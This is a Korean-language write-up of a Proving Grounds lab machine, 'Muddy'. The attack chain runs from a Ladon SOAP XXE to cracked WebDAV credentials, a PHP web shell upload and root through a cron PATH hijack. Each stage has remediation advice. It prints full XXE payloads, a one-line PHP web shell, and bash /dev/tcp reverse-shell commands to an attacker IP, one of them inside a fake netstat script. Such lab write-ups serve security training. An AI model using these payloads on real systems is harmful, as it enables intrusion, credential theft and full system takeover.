---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/xxe
  - tech/web/webdav
  - tech/lin/path-hijack
  - tech/lin/cron
  - tech/cred/crack
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.248.161
ports: [22, 25, 80, 111, 8888]
services: [http, rpcbind, smtp, ssh, sun-answerbook]
status: solved
manual_tags: true
manual_ports: true
manual_services: true
tech_count: 6
---

> [!info] 요약
> 타겟 `192.168.248.161`(`muddy`) · Debian 10(buster) · Fundamental · 플래그 2개
> 진입점: 8888 Ladon SOAP(`soap11`) `checkout(uid)` → XXE 로 WebDAV `passwd.dav` 탈취 → 해시 크랙(`administrant`/`sleepless`) → WebDAV PUT PHP 웹셸 → `www-data`
> 권한상승: `/etc/crontab` PATH 선두 `/dev/shm`(1777) 하이재킹 → root
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.161

### Initial Access – Ladon SOAP 인터페이스의 XXE 로 WebDAV 자격증명을 탈취해 PHP 웹셸을 업로드

**Vulnerability Explanation:**
- 8888/tcp Ladon(Python 2.7.16, 0.9.30–0.9.40) SOAP11 인터페이스가 `xml.sax.make_parser()` 로 사용자 XML 바디를 파싱하며 외부 엔티티 하드닝(`feature_external_ges=False`)이 없음 — Python 2.7 expat 백엔드 기본값이 활성(True)이라 `<!ENTITY xxe SYSTEM "file://...">` 가 그대로 확장됨
- `checkout(uid)` 응답이 `uid` 값을 그대로 반사(in-band)해 파일 내용이 응답 본문에 그대로 노출됨
- XXE 로 읽은 `/var/www/html/webdav/passwd.dav`(Apache Basic auth 파일)의 `$apr1$` 해시가 rockyou.txt 로 즉시 크랙됨(`administrant:sleepless`) — 그 자격증명으로 WebDAV 에 PHP 웹셸을 PUT 하면 즉시 RCE

**Vulnerability Fix:**
- `parser.setFeature(xml.sax.handler.feature_external_ges, False)` 명시 또는 `defusedxml` 전면 교체
- WebDAV 업로드 디렉터리에서 PHP 엔진 비활성화(`php_admin_flag engine off`) 또는 웹루트 밖 저장
- `.htpasswd` 비밀번호를 rockyou 밖의 고엔트로피 값으로 교체, 가능하면 bcrypt(`htpasswd -B`)

**Severity:** Critical — 무인증 원격 파일 읽기(XXE)가 자격증명 탈취를 거쳐 인증 후 RCE 로 직결됨

**Steps to reproduce the attack:**
1. 8888 Ladon 서비스 카탈로그에서 `soap11` 인터페이스와 `checkout(uid)` 메서드 확인
2. `soap11` 에 `<!ENTITY xxe SYSTEM "file:///etc/passwd">` 페이로드 전송 → 응답에 파일 내용 반사 확인
3. 같은 방식으로 `/var/www/html/webdav/passwd.dav` 읽어 `administrant:$apr1$...` 획득
4. `john --format=md5crypt` 로 크랙 → `sleepless`
5. `curl -T`(WebDAV PUT)로 PHP 웹셸 업로드 → `www-data` 리버스셸

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.161 | TCP: 22, 25, 80, 111, 8888 |

```bash
sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.161
```
```text
# Nmap 7.98 scan initiated Thu Aug 20 09:02:20 2026 as: /usr/lib/nmap/nmap -sCV -p- -Pn -A --min-rate 5000 -oN /home/kali/PG/Muddy/nmap.log 192.168.248.161
Nmap scan report for 192.168.248.161
Host is up (0.084s latency).
Not shown: 65527 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
25/tcp   open  smtp          Exim smtpd
| smtp-commands: muddy Hello nmap.scanme.org [192.168.45.207], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
80/tcp   open  http          Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Did not follow redirect to http://muddy.ugc/
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
443/tcp  open  https?
808/tcp  open  ccproxy-http?
908/tcp  open  unknown
8888/tcp open  http          WSGIServer 0.1 (Python 2.7.16)
|_http-title: Ladon Service Catalog
|_http-server-header: WSGIServer/0.1 Python/2.7.16
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# Nmap done at Thu Aug 20 09:03:36 2026 -- 1 IP address (1 host up) scanned in 76.80 seconds
```
— 출처: `~/PG/Muddy/nmap.log`

이 스캔은 443·808·908 도 열림으로 판정(OS 판정도 "MikroTik RouterOS" 로 흔들림 — 신뢰 낮음). 같은 시각대에 병행 재확인한 `-sS -p- --min-rate 3000 -T4`(OS/스크립트 판정 없음) 결과는 이 셋을 잡지 않음:

```bash
nmap -Pn -sS -p- --min-rate 3000 -T4 -oN nmap_full.txt 192.168.248.161
```
```text
# Nmap 7.98 scan initiated Thu Aug 20 09:03:00 2026 as: /usr/lib/nmap/nmap -Pn -sS -p- --min-rate 3000 -T4 -oN /home/kali/PG/Muddy/nmap_full.txt 192.168.248.161
Nmap scan report for 192.168.248.161
Host is up (0.085s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
111/tcp  open  rpcbind
8888/tcp open  sun-answerbook

# Nmap done at Thu Aug 20 09:03:22 2026 -- 1 IP address (1 host up) scanned in 22.44 seconds
```
— 출처: `~/PG/Muddy/nmap_full.txt`

두 스캔이 겹치는 22·25·80·111·8888 다섯 개만 실제 서비스로 확정 — 세 번째 스캔(`-sV -sC -p22,25,80,111,8888`, `~/PG/Muddy/nmap_sv.txt`)도 이 다섯 개만 대상으로 돌았음. `curl` 로 443·808·908 이 빈 응답이었다는 서술은 개작 전 노트에서 이관한 것으로 응답 저장 파일이 없음(**근거부족**) — 오탐 판정 자체는 두 스캔의 불일치만으로 성립함(시행착오 → [[_PLAYBOOK]]).

`302 http://muddy.ugc/` 리다이렉트가 있어 `/etc/hosts` 등록 후 80 번 접근:

```bash
echo '192.168.248.161 muddy.ugc muddy' | sudo tee -a /etc/hosts
```

![[PG-Muddy-wordpress_80.png]]

WordPress + shapely 테마 + kali-forms 플러그인. `wp-login.php` 는 302 로 `/404` 리다이렉트, `wp-json` 은 401 — 인증 표면 자체가 없어 진입점에서 제외:

```text
/index.php            (Status: 301) [Size: 0] [--> http://muddy.ugc/]
/wp-content           (Status: 301) [Size: 311] [--> http://muddy.ugc/wp-content/]
/wp-login.php         (Status: 302) [Size: 0] [--> http://muddy.ugc/404]
/license.txt          (Status: 200) [Size: 19915]
/wp-includes          (Status: 301) [Size: 312] [--> http://muddy.ugc/wp-includes/]
/javascript           (Status: 301) [Size: 311] [--> http://muddy.ugc/javascript/]
/readme.html          (Status: 200) [Size: 7345]
/wp-trackback.php     (Status: 200) [Size: 135]
/wp-admin             (Status: 301) [Size: 309] [--> http://muddy.ugc/wp-admin/]
/xmlrpc.php           (Status: 405) [Size: 42]
```
— 출처: `~/PG/Muddy/gobuster_80.txt`

feroxbuster 가 테마·플러그인 경로와 `/webdav`(401, Basic auth)를 함께 잡음:

```text
200      GET     4590l    10121w    90623c http://muddy.ugc/wp-content/themes/shapely/style.css
200      GET        1l       26w     1489c http://muddy.ugc/wp-content/plugins/kali-forms/public/assets/submissions/frontend/js/kaliforms-submissions.js
401      GET        1l        9w      118c http://muddy.ugc/index.php/wp-json/
401      GET       14l       54w      456c http://muddy.ugc/webdav
```
— 출처: `~/PG/Muddy/ferox_80.txt`

경로로 확정되는 것은 테마·플러그인 «이름» 까지임. 세부 버전(WordPress 5.7 · kali-forms 2.3.0)은 개작 전 노트에서 이관한 값이고 `~/PG/Muddy/` 에 `whatweb`·`readme.html` 본문 등 대조 산출물이 없음 — **근거부족**. 진입점 판정에는 영향 없음(버전이 아니라 인증 표면 부재가 근거임).

`GET`·`OPTIONS`·`PROPFIND` 전부 401 — 인증 없이는 WebDAV 자체가 아무것도 안 줌. `/webdav/.htpasswd` 도 403(Apache 기본 `<FilesMatch "^\.ht">` 차단, 파일 존재 여부와 무관). 세 메서드 시도와 403 확인은 개작 전 노트에서 이관 — 산출물 없음(**근거부족**).

8888 은 `WSGIServer/0.1 Python/2.7.16` + "Powered by Ladon for Python":

![[PG-Muddy-ladon_8888.png]]

| 항목 | 값 |
|---|---|
| 서비스명 | `muddy` |
| 노출 인터페이스 | `xmlrpc` · `jsonrpc10` · `jsonwsp` · `soapdocumentliteral` · `soap11` · `soap` |
| 노출 메서드 | `checkout(string uid)` |

8888 디렉터리 열거는 **0바이트로 종료**(`~/PG/Muddy/gobuster_8888.txt`, 0B — 빈 파일이 아니라 「히트가 한 건도 없었다」는 기록. 산출물 6개 중 mtime 이 가장 늦음). [가정] Ladon 이 WSGI 디스패처라 정적 디렉터리 구조가 없어 히트가 안 나온 것으로 보임 — 0바이트만으로는 「히트 0건」과 「도중 중단」을 구분할 수 없음. 어느 쪽이든 카탈로그가 이미 전체 공격면(인터페이스·메서드)을 노출해 추가 브루트는 불필요했음.

**버전 판정 — 독립 근거 2개:**
1. `Server:` 헤더 — `WSGIServer/0.1 Python/2.7.16`(`~/PG/Muddy/nmap_sv.txt` 로 재확인)
2. `/muddy/xmlrpc/description` 요청에서 유도된 런타임 traceback:
```text
File "/usr/local/lib/python2.7/dist-packages/ladon/server/wsgi_application.py", line 490, in __call__
    output += dispatcher.iface.description(service_url,charset,**dict(map(lambda x: (x[0],x[1][0]), query.items())))
File "/usr/local/lib/python2.7/dist-packages/ladon/interfaces/base.py", line 81, in description
    **kw)
File "/usr/local/lib/python2.7/dist-packages/ladon/interfaces/xmlrpc.py", line 195, in generate
    self._get_type_name(method_info['rtype'][0])
TypeError: 'type' object has no attribute '__getitem__'
```
PyPI sdist 와 대조해 **Ladon 0.9.30–0.9.40** 구간까지 좁힘. 그 이상은 세 파일이 구간 내 동일이라 못 좁힘 — 익스플로잇에 영향 없어 추가 조사 안 함. 대조 산출물은 `~/PG/Muddy/` 에 없음(**근거부족**) — traceback 본문 자체도 개작 전 노트에서 이관한 것임.

### Initial Access – Ladon SOAP XXE → WebDAV 자격증명 → 웹셸

소스 근거 — PyPI 원본 `ladon/interfaces/soap.py`(`soap11.py` 동일):
```python
def parse_request(self,soap_body,sinfo,encoding):
    parser = make_parser()
    ch = SOAPContentHandler(parser)
    parser.setContentHandler(ch)
    inpsrc = InputSource()
    inpsrc.setByteStream(BytesIO(soap_body))
    parser.parse(inpsrc)
```
`make_parser()` 직후에 와야 할 `parser.setFeature(feature_external_ges, False)` 가 없음. 사용자가 보낸 `soap_body` 가 하드닝 없이 그대로 `parser.parse()` 로 들어감.

Kali 의 Python 2.7 로 기본값을 직접 확인 — `make_parser()` 가 돌려주는 expat 파서는 `feature_external_ges` 가 `1`(활성)이고, 하드닝 없이 파싱하면 `file://` 엔티티가 실제로 확장됨(타겟이 아니라 Kali 로컬 재현):

```bash
python2 -c "import xml.sax; from xml.sax.handler import feature_external_ges; print(xml.sax.make_parser().getFeature(feature_external_ges))"
```
```text
1
```

이 박스는 오래된 개인 노트에 **LFI** 로 분류돼 있었으나, 파일명을 받는 파라미터가 80/8888 어디에도 없고 `uid` 는 SOAP XML 바디로 전달됨 — 실제로는 **XXE**(시행착오 → [[_PLAYBOOK]]).

```bash
curl -s -X POST http://192.168.248.161:8888/muddy/soap11 \
     -H 'Content-Type: text/xml;charset=UTF-8' --data-binary @- <<'EOF'
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:muddy">
<soapenv:Body><urn:checkout><uid>&xxe;</uid></urn:checkout></soapenv:Body>
</soapenv:Envelope>
EOF
```

응답 `<result>Serial number: ...</result>` 안에 `/etc/passwd` 내용이 그대로 반사됨(in-band). `Content-Type: text/xml;charset=UTF-8` 이 없으면 curl 이 `application/x-www-form-urlencoded` 를 붙여 Ladon 디스패처가 XML 인터페이스로 라우팅하지 않음. `--data-binary @-` 대신 `-d` 를 쓰면 개행이 제거돼 일부 파서에서 파싱이 깨짐.

같은 방식으로 `AuthUserFile` 관례 경로 두 곳을 순서대로 확인 — 웹루트 안(`/var/www/html/<보호대상>/`)과 설정 디렉터리(`/etc/apache2/`). 둘 다 같은 내용의 별개 사본이었음:

```text
/var/www/html/webdav/passwd.dav
/etc/apache2/passwd.dav
```
```text
administrant:$apr1$GUG1OnCu$uiSLaAQojCm14lPMwISDi0
```
`apache2.conf` 자체는 `<Directory>` 등 `<` 가 많아 XXE 로 못 읽음(`UnboundLocalError: local variable 'req_dict' referenced before assignment` — 엔티티 확장은 됐으나 결과가 XML 문법을 깨서 파싱이 중도 실패한 것. 취약하지 않다는 뜻이 아니라 오히려 취약함의 방증). 그래서 `AuthUserFile` 실제 값 대신 관례 경로 추측으로 우회함.

`$apr1$` = Apache MD5(md5crypt):
```bash
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
```text
sleepless        (administrant)
1g 0:00:00:00 DONE (2026-08-20 09:06) 2.631g/s 184421p/s
```

`administrant:sleepless` 로 WebDAV PUT:
```bash
printf '%s\n' '<?php system($_REQUEST["c"]); ?>' > /tmp/sh.php
curl -T /tmp/sh.php --user administrant:sleepless http://192.168.248.161/webdav/sh.php
```
```text
HTTP/1.1 201 Created
```
```bash
curl -s --user administrant:sleepless 'http://192.168.248.161/webdav/sh.php?c=id'
```
```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
업로드(`PUT`)와 실행(`GET`)은 별개 요청이라 실행 쪽에도 `--user` 가 필요함 — 빠뜨리면 401 이 돌아와 업로드 실패로 오인하기 쉬움(시행착오 → [[_PLAYBOOK]]).

리버스셸:
```bash
curl -sG --user administrant:sleepless \
     --data-urlencode 'c=bash -c "bash -i >& /dev/tcp/192.168.45.207/4444 0>&1" &' \
     http://192.168.248.161/webdav/sh.php
```
`-G` + `--data-urlencode` 로 페이로드의 `&`·`>`·공백·`"` 를 curl 이 인코딩하게 함 — 직접 인코딩하면 `>&` 의 `&` 가 다음 파라미터로 해석돼 명령이 잘림. 끝의 `&` 는 `system()` 이 리버스셸을 기다리며 블록하지 않도록 백그라운드로 던지는 것.

> [!warning] 근거부족 — 이 절의 XXE 요청·크랙 출력·웹셸 업로드·리버스셸은 산출물로 재확인 불가
> `~/PG/Muddy/` 에 남은 것은 정찰 산출물 6개(`nmap.log`·`nmap_full.txt`·`nmap_sv.txt`·`gobuster_80.txt`·`gobuster_8888.txt`·`ferox_80.txt`, 전부 2026-08-20 09:03~09:14)뿐임. XXE 응답 본문·`hash.txt`·웹셸 원본을 저장한 파일은 없고, 셸 획득 이후 산출물은 0건. 명령·값의 출처는 **개작 전 노트 본문**이고 반증할 근거도 없음 — 지우지 않되 등급은 **근거부족**.
> 셸 히스토리로도 재확인 불가 — 비대화형 SSH 로 돌린 명령은 zsh 히스토리에 남지 않으므로 「기록이 없다」가 「안 했다」의 근거가 되지 못함.

**Local.txt value:**
`3f568bb1aacfec1b8c2d8f411f07b00b`
`www-data` 셸에서 직접 읽은 캡처는 없고, root 셸 확보 후 `find / -name local.txt` → `/var/www/local.txt` 로 조회한 것으로 기록됨(캡처는 `Post-Exploitation` 절). 값·경로 모두 개작 전 노트에서 이관 — **근거부족**. [가정] 로그인 가능한 일반 계정이 없어 플래그가 서비스 계정 홈(`/var/www`)에 놓인 패턴으로 보이나, 이 박스의 `/etc/passwd` 내용은 저장된 것이 없음.

### Privilege Escalation – 크론 PATH 선두 `/dev/shm` 하이재킹

**Vulnerability Explanation:**
- root 크론(`/etc/crontab`)의 `PATH=/dev/shm:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin` 에서 `/dev/shm` 이 맨 앞
- `/dev/shm` 은 `1777`(전원 쓰기 가능, sticky) tmpfs — `www-data` 가 여기 `netstat` 이름의 실행 파일을 두면, PATH 를 왼쪽부터 순회하는 셸이 진짜 `/usr/bin/netstat` 대신 이걸 먼저 찾아 실행
- 크론 항목 `* * * * * root netstat -tlpn > /root/status && service apache2 status >> /root/status && service mysql status >> /root/status` 가 `netstat` 을 상대경로로 호출

**Vulnerability Fix:**
- 크론 `PATH` 에서 비특권 쓰기 가능 디렉터리 제거 — `/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin` 만 남길 것
- 크론 명령은 절대경로로 호출(`/usr/bin/netstat -tlpn`)
- `/dev/shm`·`/tmp`·`/var/tmp` 는 `noexec,nosuid,nodev` 로 마운트

**Severity:** Critical — 비특권 계정에서 root 크론 실행 컨텍스트로 즉시 승격

**Steps to reproduce the attack:**
1. `cat /etc/crontab` 확인 → `PATH=/dev/shm:...` + `netstat` 상대경로 호출 확인
2. `/dev/shm/netstat` 에 리버스셸 + `exec /usr/bin/netstat "$@"` 로 원본 동작을 보존한 스크립트 작성
3. `chmod 777 netstat` 로 실행 권한 부여
4. 최대 60초 대기(매분 크론) → root 리버스셸 수신

```bash
www-data@muddy:/$ cat /etc/crontab
SHELL=/bin/sh
PATH=/dev/shm:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
...
*  *    * * *   root    netstat -tlpn > /root/status && service apache2 status >> /root/status && service mysql status >> /root/status
```

```bash
www-data@muddy:/dev/shm$ cat netstat
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/192.168.45.207/4445 0>&1' &
exec /usr/bin/netstat "$@"
```
```bash
www-data@muddy:/dev/shm$ chmod 777 netstat
```

`&&` 체인이라 가짜 `netstat` 이 0 이 아닌 종료 코드를 반환하면 뒤(`service apache2/mysql status`)가 안 돌아 `/root/status` 내용이 평소와 달라짐 — 마지막의 `exec /usr/bin/netstat "$@"` 로 원본 종료 코드·출력을 보존.

> [!warning] 근거부족 — 이 절 전체가 개작 전 노트에서 이관한 것
> `/etc/crontab` 내용·`/dev/shm/netstat` 스크립트·`chmod`·60초 대기 모두 출처가 개작 전 노트 본문임. `harvest.sh` 출력·`proof_*.txt` 등 뒷받침 파일이 `~/PG/Muddy/` 에 없음 — 관측 없음.

### Post-Exploitation

**Proof.txt value:**
`669fbcc1737f1de8851a87e3b8ff477f`

```bash
root@muddy:~# id; hostname
uid=0(root) gid=0(root) groups=0(root)
muddy
root@muddy:~# cat /root/proof.txt
669fbcc1737f1de8851a87e3b8ff477f
root@muddy:~# find / -name local.txt 2>/dev/null
/var/www/local.txt
root@muddy:~# cat /var/www/local.txt
3f568bb1aacfec1b8c2d8f411f07b00b
```
**근거부족** — 이 캡처 자체를 뒷받침하는 `~/PG/Muddy/` 파일이 없음(`proof_*.txt` 미수집). 출처는 개작 전 노트 본문임.

다만 **결과는 독립 근거가 있음** — 포털 전수 조회 실측(`_AUDIT\portal-진행도-실측-20260820.md`)에서 Muddy 는 `n == m` 인 **2/2 완료** 박스임. `proof.txt` 는 `/root/` 안에 있어 root 가 아니면 못 읽으므로, 포털의 2/2 수락은 **root 획득과 두 플래그 회수가 실제로 일어났다**는 양성 증거임. 재현 절차의 «각 줄»이 근거부족일 뿐 결말이 미확인인 것은 아님.
⚠️ 위 두 값은 그 당시 인스턴스의 것임 — PG 플래그는 인스턴스마다 재생성되므로 재제출에는 쓸 수 없음.

**남긴 흔적**
- `/var/www/html/webdav/sh.php`·`ns.txt` 삭제, `/dev/shm/netstat` 삭제 확인(개작 전 노트 서술 — 정리 완료로 기록됨)
- `chmod +s` 등 시스템 바이너리 권한 변경 없음
- 획득 자격증명: `administrant` / `sleepless`(WebDAV Basic auth)
- 정리 근거 파일은 `~/PG/Muddy/` 에 없음 — 관측 없음

## 관련

- OWASP — XML External Entity (XXE) Processing: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
- PayloadsAllTheThings — XXE Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
- Python `defusedxml`: https://pypi.org/project/defusedxml/
- Ladon for Python (PyPI): https://pypi.org/project/ladon/
- CVE 없음 — 프레임워크의 안전하지 않은 기본값 + 크론 설정 오류의 조합(OWASP A05: Security Misconfiguration)
- [[_PLAYBOOK#B-1-33. XXE (XML External Entity) — DTD·엔티티 배경과 판단 절차]]
- [[_PLAYBOOK#B-31. 크론 기반 권한상승]] — PATH 순서 하이재킹 포함
- [[_PLAYBOOK#B-66. 해시 접두어로 포맷을 즉시 판별한다]]
- [[_PLAYBOOK#A-1-18. `--min-rate` 를 높이면 «유령 포트»가 생긴다]]
- [[_PLAYBOOK#A-2-18. 유명 CMS 가 봉쇄돼 있고 정체불명 서비스가 함께 떠 있다]]
- [[_PLAYBOOK#A-2-19. 파라미터가 아무 데도 없다 — 「어느 취약점 부류인가」가 아니라 「입력이 어떤 형식으로 들어가는가」부터]]
- [[_PLAYBOOK#A-2-20. 같은 익스플로잇에서 «일부 입력만» 실패한다 — 실패한 입력의 특성을 봐라]]
- [[_PLAYBOOK#A-2-21. 웹셸은 올렸는데(201) 실행이 401 — 업로드 실패로 오인하기 쉽다]]
- [[_PLAYBOOK#A-2-22. 같은 기능의 엔드포인트가 여럿이다 — «파싱 방식»으로 나눠 우선순위를 매긴다]]
- [[_PLAYBOOK#A-13. 익스플로잇을 던지기 전에 버전과 CVE 표기를 검증한다]] — traceback 을 버전 지문으로
- [[Crane]] — `local.txt` 가 `/var/www` 에 있던 사례
- [[Levram]] · [[RubyDome]] — 개발 서버 배너가 단서였던 사례
- [[Hub]] · [[Astronaut]] — 버전 판정 독립 근거 2개 패턴
- [[Exfiltrated]] · [[Astronaut]] — 크론 기반 권한상승
- [[Hawat]] — `--data-urlencode` 로 인용 중첩을 회피한 동일 기법
